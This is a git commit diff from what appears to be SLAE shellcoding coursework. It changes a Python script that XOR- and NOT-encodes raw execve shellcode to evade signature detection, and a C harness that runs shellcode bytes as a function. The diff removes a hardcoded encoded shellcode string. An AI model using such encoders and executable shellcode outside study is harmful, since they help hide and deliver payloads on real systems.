6c45e4ad22892d589d4fb3a6a98d080428d299d4
RomainLanglois <romain.langlois@viacesi.fr>
2020-01-28 22:04:47 +0100

    Update file

--- SLAE/assignment4/encoder.py
+++ SLAE/assignment4/encoder.py
@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-# Python XOR and NOT bits encoders
+# Python XOR and NOT encoder
 
 # The shellcode used is a basic systemcall to execve
 shellcode = b"\x31\xdb\x53\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x31\xc9\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"
@@ -8,9 +8,7 @@ encoded_shellcode = ""
 print('Shellcode len: {}'.format(len(shellcode)))
 print('Encoded shellcode ...')
 
-# Encode the shellcode in two steps:
-# First, use a XOR encoder
-# Then, use a NOT encoder
+# Encode the shellcode in two steps (A XOR then a NOT):
 for x in bytearray(shellcode):
 	# XOR encoder part
 	# 0xAA is the Byte used to encode
@@ -20,8 +18,6 @@ for x in bytearray(shellcode):
 	y = ~y
 	encoded_shellcode += '{},'.format(hex(y & 0xFF))
 
-# Remove minus sign created by the NOT encoder
-encoded_shellcode = encoded_shellcode.replace('-','')
 # Print an encoded shellcode format
 print(encoded_shellcode)
 
--- SLAE/assignment4/test_shellcode.c
+++ SLAE/assignment4/test_shellcode.c
@@ -2,18 +2,17 @@
 #include <string.h>
 
 // decoder.nasm shellcode is stored here
-unsigned char code[] = \
-"\x31\xc9\xb1\x1e\xeb\x0b\x5e\xf6\x16\x80\x36\xaa\x46\xe2\xf8\xeb\x05\xe8\xf0\xff\xff\xff\x64\x8e\x06\x3d\x37\x34\x26\x3d\x3d\x37\x3c\x3b\x7a\x3d\x7a\x7a\x7a\x7a\xdc\xb6\x64\x9c\x64\x87\x64\x95\xe5\x5e\x98\xd5";
+unsigned char shellcode[] = \
+INSERT_SHELLCODE;
 
-main()
+int main()
 {
 	// print the length of the shellcode
-	printf("Shellcode Length:  %d\n", strlen(code));
+	printf("Shellcode Length:  %d\n", strlen(shellcode));
 	// convert shellcode to a function
-	int (*ret)() = (int(*)())code;
+	int (*ret)() = (int(*)())shellcode;
 	// execute the shellcode has a function
 	ret();
-
 }
 
 
